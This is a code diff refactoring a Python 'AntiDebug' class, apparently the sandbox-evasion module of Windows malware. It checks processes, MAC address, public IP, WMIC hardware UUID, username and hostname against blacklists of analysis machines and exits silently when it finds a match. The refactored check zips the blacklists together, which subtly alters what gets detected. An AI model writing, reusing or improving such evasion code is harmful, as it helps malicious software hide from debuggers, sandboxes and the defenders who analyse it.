@@ -3,15 +3,15 @@ import re
 import subprocess
 import sys
 import uuid
-
 import psutil
 import requests
+from typing import Literal
 
 
 class AntiDebug:
     def __init__(self) -> None:
         if self.checks():
-            self.self_destruct()
+            sys.exit(int())
 
     def checks(self) -> bool:
         debugging = False
@@ -37,7 +37,7 @@ class AntiDebug:
 
         return debugging
 
-    def check_process(self) -> bool:
+    def check_process(self) -> None:
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                 try:
@@ -45,7 +45,7 @@ class AntiDebug:
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
 
-    def get_network(self) -> bool:
+    def get_network(self) -> Literal[True] | None:
         ip = requests.get('https://api.ipify.org').text
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
@@ -54,19 +54,13 @@ class AntiDebug:
         if mac in self.blackListedMacs:
             return True
 
-    def get_system(self) -> bool:
-        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
-                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-        
+    def get_system(self) -> Literal[True] | None:
+        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
+                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
 
-        if hwid in self.blackListedHWIDS:
-            return True
-        if username in self.blackListedUsers:
-            return True
-        if hostname in self.blackListedPCNames:
-            return True
-
-    def self_destruct(self) -> None:
-        sys.exit()
+        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
+            if hwid in i or username in i or hostname in i:
+                return True
